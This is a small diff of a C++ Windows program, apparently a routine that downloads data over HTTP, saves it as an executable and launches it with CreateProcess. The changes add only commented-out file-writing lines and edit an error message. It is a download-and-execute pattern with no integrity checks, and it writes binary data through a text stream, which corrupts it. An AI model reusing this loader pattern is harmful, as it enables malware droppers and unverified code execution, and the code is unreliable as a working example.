@@ -138,6 +138,10 @@ int main()
 							ofstream fout(exe);
 							fout << buffer;
 
+							/*ofstream outfile;
+							outfile.open(exe);
+							outfile << buffer;*/
+
 							while (bytesRead)
 							{
 								memset(buffer, 0, sizeof(buffer));
@@ -150,8 +154,10 @@ int main()
 									return -1;
 								}
 								fout << buffer;
+								//outfile << buffer;
 							}
 							fout.close();
+							//outfile.close();
 
 							PROCESS_INFORMATION pi;
 							STARTUPINFO si;
@@ -159,7 +165,7 @@ int main()
 							si.cb = sizeof(si);
 
 							if (!CreateProcess(exe.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
-								cout << "[Process 1] Cannot create process.Error code: " << GetLastError();
+								cout << "Cannot create process.Error code: " << GetLastError();
 								return -1;
 							}
 							CloseHandle(hHttpOpenRequest);
